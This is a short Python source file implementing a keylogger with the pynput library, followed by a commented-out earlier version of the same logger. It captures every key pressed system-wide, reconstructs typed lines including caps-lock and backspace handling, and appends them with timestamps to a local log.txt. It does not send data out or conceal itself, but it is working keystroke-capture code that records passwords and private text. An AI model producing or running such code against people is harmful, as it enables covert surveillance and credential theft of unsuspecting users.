from pynput.keyboard import Listener
from string import ascii_letters, printable
from datetime import datetime

list_of_str2add = []
is_capslk_pressed = False
include_write2file = True

def write2file(str2file, name_of_file = "log.txt",\
    include_date_time = True):
        with open(name_of_file, 'a') as f:
            if str2file != '':
                f.write(f'{datetime.now()}: {str2file}\n'\
                    if include_date_time\
                    else f'{str2file}\n')

def corrected_key(key):
    correct_key = key

    if key == 'Key.space': correct_key = ' '

    global is_capslk_pressed
    if key == 'Key.caps_lock':
        is_capslk_pressed = not is_capslk_pressed
    
    if correct_key in ascii_letters and is_capslk_pressed:
        correct_key = correct_key.upper()

    if correct_key in printable + ' ':
        return correct_key

    else: return ''

def log_keystroke(key):
    key = str(key).replace("'", '')

    global list_of_str2add
    if key == 'Key.backspace' and len(list_of_str2add) != 0:
        list_of_str2add.pop(-1)

    list_of_str2add.append(corrected_key(key))
    
    if key == 'Key.enter' and corrected_key != '':
        if include_write2file:
            write2file("".join(list_of_str2add))
        list_of_str2add.clear()

def main():
    with Listener(on_press=log_keystroke) as l:
        l.join()

if __name__ == "__main__":
    main()


# def log_keystroke(key):
#     key = str(key).replace("'", "")

#     if key == 'Key.space': key = ' '
#     if key == 'Key.shift_r':
#         if key in ascii_letters: key = key.upper()
    
#     global is_capslk_pressed
#     if key == 'Key.caps_lock':
#         is_capslk_pressed = not is_capslk_pressed

#     global str2file
#     if key != 'Key.enter' and key in printable:
#         if key in ascii_letters and is_capslk_pressed: 
#             str2file += key.upper()
#         else: str2file += key

#     with open("log.txt", 'a') as f:
#         if key == "Key.enter":
#             if str2file != '':
#                 f.write(f'{datetime.now()}: {str2file}\n')
#                 str2file = ''

# def main():
#     with Listener(on_press= log_keystroke) as l:
#         l.join()

# if __name__ == "__main__":
#     main()
